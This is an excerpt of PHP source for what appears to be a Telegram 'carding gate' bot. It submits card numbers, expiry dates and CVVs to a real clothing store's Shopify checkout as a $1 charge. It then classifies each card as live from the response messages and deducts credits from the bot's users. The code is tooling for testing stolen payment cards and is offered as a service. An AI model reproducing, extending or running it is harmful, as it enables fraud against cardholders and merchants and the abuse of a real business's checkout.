...
$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "𝐆𝐚𝐭𝐞 𝐈𝐧𝐟𝐨 - <b>\n• Shopify+Cybersource (v1) 1$ Charge - /sfc \n• Other Gates - /cmds </b> ",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}
...
curl_setopt($ch, CURLOPT_URL, 'https://zsupplyclothing.com/7670759477/checkouts/ee91e7cea5921d0a870b4b1d1dcea495');
...
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$c1.' '.$c2.' '.$c3.' '.$c4.'","name":"Jack Coddrey","month":'.$mon.',"year":'.$year.',"verification_value":"'.$cvv.'"},"payment_session_scope":"zsupplyclothing.com"}');
$curl6 = curl_exec($ch);
...
if ((strpos($curl11, 'Thank you for your purchase')) or (strpos($curl10, 'CyberSource because it did not pass the AVS check')) or (strpos($curl10, 'Insufficient')))
{ $creditsToDeduct = 2;} 
else 
{ $creditsToDeduct = 1;}
